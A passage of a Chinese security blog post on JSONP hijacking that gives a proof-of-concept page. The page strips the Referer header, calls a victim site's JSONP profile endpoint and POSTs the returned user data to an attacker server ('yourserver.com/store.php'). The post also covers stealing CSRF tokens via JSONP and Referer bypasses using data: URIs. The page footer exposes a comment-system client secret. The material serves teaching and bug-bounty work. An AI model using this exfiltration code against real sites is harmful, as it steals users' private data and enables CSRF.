+<h2 id="绕过Referer-Check"><a href="#绕过Referer-Check" class="headerlink" title="绕过Referer Check"></a>绕过Referer Check</h2><p>最近最后我发现了一个易受<strong>JSONP</strong>攻击的<strong>API</strong>端点，使用回调函数获取数据的代码工作正常，当我从我的PC本地运行代码时，我从<strong>文件</strong>中获取数据<strong>://</strong>。但是当我在Web服务器上传文件时，我收到了一个错误的<strong>OBJECT</strong>而不是数据，其中包含<strong>身份验证</strong>错误和<strong>重定向URL</strong>到站点的登录页面。(Server正在检查<strong>Referer</strong> Header，如果<strong>Referer Header</strong>值包含<strong>跨域</strong>，则Server拒绝请求)</p>
+<p>所以为了绕过这个ecurit检查，我只需要删除<strong>Referer</strong> Header。</p>
+<p>我使用<strong>HTML</strong>元标记限制浏览器发送<strong>Referer</strong> Header，它是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name =“referrer”content =“no-referrer”&gt;</span><br></pre></td></tr></table></figure>
+
+<p>因此，在<strong>HTML</strong>头标记中添加此元标记可以完成这项工作。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">”referrer”</span> <span class="attr">content</span>=<span class="string">”no-referrer”</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">call_me</span>(<span class="params">response</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> url = ‘https:<span class="comment">//yourserver.com/store.php';</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> params = ‘data=’+<span class="built_in">JSON</span>.stringify(response);</span></span><br><span class="line"><span class="javascript">http.open(‘POST’, url, <span class="literal">true</span>);</span></span><br><span class="line">http.setRequestHeader(‘Content-type’, ‘application/x-www-form-urlencoded’);</span><br><span class="line"><span class="javascript">http.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(http.readyState == <span class="number">4</span> &amp;&amp; http.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(http.responseText);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">http.send(params);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">”https://user.redact.com/api/user/profile?callback</span>=<span class="string">call_me</span>"&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>JSONP攻击</strong></p>
+<p><strong>1.JSONP 跨域劫持</strong></p>
+<p>实际上就是由于服务器端对JSONP 的请求来源的检查不严格导致的</p>
+<p>攻击者模拟用户向有漏洞的服务器发送JSONP请求，然后就获取到了用户的某些信息，再将这些信息发送到攻击者可控的服务器</p>
+<p><strong>2.JSONP 跨域劫持token 实现CSRF</strong></p>
+<p>通过 jsonp 发起请求，得到泄露的 csrf_token 然后，利用这个token 实现CSRF 攻击</p>
+<p><strong>3.Referer 头的绕过</strong></p>
+<p>在攻击过程中可能会涉及到 referer 头的绕过</p>
+<ol>
+<li>data:URL<br>为了逃避他的检测我们可以选择不发送referer这个头，那么怎么做呢？这就涉及到 data:URL 头</li>
+</ol>
+<p>为了构造一个不带HTTP Referer的请求，我们可以滥用data URI方案。因为我们正在处理的代码包含了引号，双引号，以及其他一些被阻止的语句，接着使用base64编码我们的payload（回调函数定义以及脚本包含）<br>data:text/plain;base64our_base64_encoded_code:</p>
+<p>以下3个HTML标签允许我们使用data URI方案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iframe (在src属性中) – Internet Explorer下不工作</span><br><span class="line">embed (在src属性中) – Internet Explorer及Microsoft Edge下不工作</span><br><span class="line">object (在data属性中) – Internet Explorer及Microsoft Edge下不工作</span><br></pre></td></tr></table></figure>
+
+<p>2.从HTTPS向HTTP发起请求</p>
+<p>如果目标网站可以通过HTTP访问，也可以通过将我们的代码托管在一个HTTPS页面来避免发送HTTP Referer。如果我们从HTTPS页面发起一个HTTP请求，浏览器为了防止信息泄漏是不会发送Referer header。以上我们要将恶意代码托管在一个启用了HTTPS的站点。<br>注意：由于mixed-content安全机制，在浏览器默认设置下是不会工作的。需要受害者手动允许浏览器发出的安全警告。</p>
+<p>Reference：<br><a href="http://www.admintony.com/csrf-and-json.html" target="_blank" rel="noopener">http://www.admintony.com/csrf-and-json.html</a></p>
+<p><a href="http://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/" target="_blank" rel="noopener">k0rz3n</a></p>
+<p><a href="https://medium.com/bugbountywriteup/exploiting-jsonp-and-bypassing-referer-check-2d6e40dfa24" target="_blank" rel="noopener">https://medium.com/bugbountywriteup/exploiting-jsonp-and-bypassing-referer-check-2d6e40dfa24</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2018/12/28/2018-12-28-JSONP漏洞/" title="jsonp漏洞">https://wh0ale.github.io/2018/12/28/2018-12-28-JSONP漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/csrf/" rel="tag"><i class="fa fa-tag"></i># csrf</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2018/12/26/2018-12-27-NodeJs/" rel="next" title="Nodejs反序列化">
+                <i class="fa fa-chevron-left"></i> Nodejs反序列化
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2018/12/30/2018-12-30-BypassWaf_xss/" rel="prev" title="BypassWaf_xss">
+                BypassWaf_xss <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#jsonp简单利用"><span class="nav-number">1.</span> <span class="nav-text">jsonp简单利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用JSONP和绕过引用检查"><span class="nav-number">2.</span> <span class="nav-text">利用JSONP和绕过引用检查</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过Referer-Check"><span class="nav-number">2.1.</span> <span class="nav-text">绕过Referer Check</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
